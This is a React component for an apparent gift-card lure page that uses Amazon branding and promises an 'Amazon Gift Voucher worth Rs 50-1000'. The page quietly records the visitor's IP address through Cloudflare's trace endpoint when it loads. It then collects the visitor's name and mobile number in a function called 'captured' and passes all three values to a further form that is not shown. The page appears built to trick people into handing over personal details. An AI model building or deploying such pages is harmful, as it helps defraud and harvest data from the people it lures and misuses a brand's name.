import React, { useState,useEffect } from 'react';
import Form from './Form';
import './GiftPage.css'; // Import the CSS file for styling
import amazon from './amazongc.png'

const GiftPage = () => {
  const [next, setNext] = useState(false);
  const [IP, setIP] = useState();
  const [formData, setFormData] = useState({
    name: '',
    mobile: ''
  });

  const [formErrors, setFormErrors] = useState({
    name: '',
    mobile: ''
  });

  useEffect(() => {
    const getIp = async () => {
      try {
        const response = await fetch(
          "https://www.cloudflare.com/cdn-cgi/trace"
        );
        const data = await response.text();
        const ipMatch = data.match(/ip=(.*)/);
        if (ipMatch && ipMatch.length > 1) {
          const ipAddress = ipMatch[1];
          setIP(ipAddress);
        }
      } catch (err) {
        setIP(err)
      }
    };

    getIp();
  },[]);

  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
    setFormErrors((prevFormErrors) => ({
      ...prevFormErrors,
      [name]: '',
    }));
  };

  const handleSubmit = (event) => {
    event.preventDefault();

    // Validate the form fields
    let errors = {};
    if (!formData.name.trim()) {
      errors.name = 'Name is required';
    }
    if (!formData.mobile.trim()) {
      errors.mobile = 'Mobile number is required';
    } else if (formData.mobile.trim().length !== 10) {
      errors.mobile = 'Mobile number should be 10 digits';
    }

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }

    // Perform form submission or other actions with the form data
    
    captured()
    
  };

  const captured =()=>{
    setNext(true);
  }

  return (
    <>
    <div className="gift-page">
      <div className="gift-page__image-container">
        <img
          className="gift-page__image"
          src={amazon}
          alt="Gift"
        />
      </div>
      {!next && <div>
      <h1 className="gift-page__title">Unlock Exclusive Benefits!</h1>
      <h5 className="">Eligible user ger an Amazon Gift Voucher worth<br/> Rs 50-1000</h5>
      <p className="gift-page__message">Check Your Eligibility for an Amazon Gift Card</p>
      <form onSubmit={handleSubmit} className="gift-page__form">
        <div className="gift-page__form-field">
          <label htmlFor="name">Name</label>
          <input
            type="text"
            id="name"
            name="name"
            value={formData.name}
            onChange={handleInputChange}
            required
          />
          {formErrors.name && <span className="error-message">{formErrors.name}</span>}
        </div>
        <div className="gift-page__form-field">
          <label htmlFor="mobile">Mobile Number</label>
          <input
            type="tel"
            id="mobile"
            name="mobile"
            value={formData.mobile}
            onChange={handleInputChange}
            required
          />
          {formErrors.mobile && <span className="error-message">{formErrors.mobile}</span>}
        </div>
        <button type="submit" className="gift-page__claim-button" >
          Check Eligibility
        </button>
      </form></div>}
    </div>
    {next && <Form name={formData.name} mobile={formData.mobile} ipAddress={IP}/>}
    </>
  );
};

export default GiftPage;
